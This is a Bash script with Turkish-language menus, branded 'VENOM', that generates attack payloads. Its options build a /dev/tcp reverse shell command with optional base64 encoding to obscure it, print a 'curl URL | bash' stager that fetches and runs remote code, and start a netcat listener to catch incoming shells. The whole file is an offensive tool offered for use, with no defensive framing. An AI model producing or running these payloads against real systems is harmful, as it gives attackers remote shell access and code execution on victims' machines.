#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

banner() {
echo -e "${CYAN}"
echo " ██╗░░░██╗███████╗███╗░░██╗░█████╗░███╗░░░███╗"
echo " ██║░░░██║██╔════╝████╗░██║██╔══██╗████╗░████║"
echo " ██║░░░██║█████╗░░██╔██╗██║██║░░██║██╔████╔██║"
echo " ██║░░░██║██╔══╝░░██║╚████║██║░░██║██║╚██╔╝██║"
echo " ╚██████╔╝███████╗██║░╚███║╚█████╔╝██║░╚═╝░██║"
echo " ░╚═════╝░╚══════╝╚═╝░░╚══╝░╚════╝░╚═╝░░░░░╚═╝"
echo -e "${NC}"
}

generate_bash_reverse() {
    echo -e "${GREEN}[+] Bash Reverse Shell oluşturuluyor...${NC}"
    read -p "LHOST: " lhost
    read -p "LPORT: " lport
    payload="bash -i >& /dev/tcp/${lhost}/${lport} 0>&1"
    echo -e "\n${CYAN}$payload${NC}"

    read -p "Base64 ile encode edilsin mi? (y/n): " enc
    if [[ $enc == "y" ]]; then
        encoded=$(echo -n "$payload" | base64)
        echo -e "\nBase64 Encoded:\n${CYAN}$encoded${NC}"
    fi
}

start_listener() {
    echo -e "${GREEN}[+] Listener başlatılıyor...${NC}"
    read -p "Port: " port
    echo -e "${CYAN}[*] nc -lvnp $port${NC}"
    nc -lvnp $port
}

generate_bash_stager() {
    echo -e "${GREEN}[+] Bash stager oluşturuluyor...${NC}"
    read -p "Payload URL: " url
    echo -e "\n${CYAN}curl $url | bash${NC}"
}

menu() {
    while true; do
        banner
        echo -e "${GREEN}1.${NC} Bash Reverse Shell"
        echo -e "${GREEN}2.${NC} Bash Stager Oluştur"
        echo -e "${GREEN}3.${NC} Listener Başlat"
        echo -e "${GREEN}0.${NC} Çıkış"
        echo -n -e "${CYAN}Seçiminiz: ${NC}"
        read choice

        case $choice in
            1) generate_bash_reverse ;;
            2) generate_bash_stager ;;
            3) start_listener ;;
            0) echo -e "${RED}[!] Görüşürüz hacker kalpli...${NC}"; exit ;;
            *) echo -e "${RED}[!] Geçersiz seçim.${NC}" ;;
        esac

        echo -e "\n${GREEN}Devam etmek için bir tuşa basın...${NC}"
        read
        clear
    done
}

menu
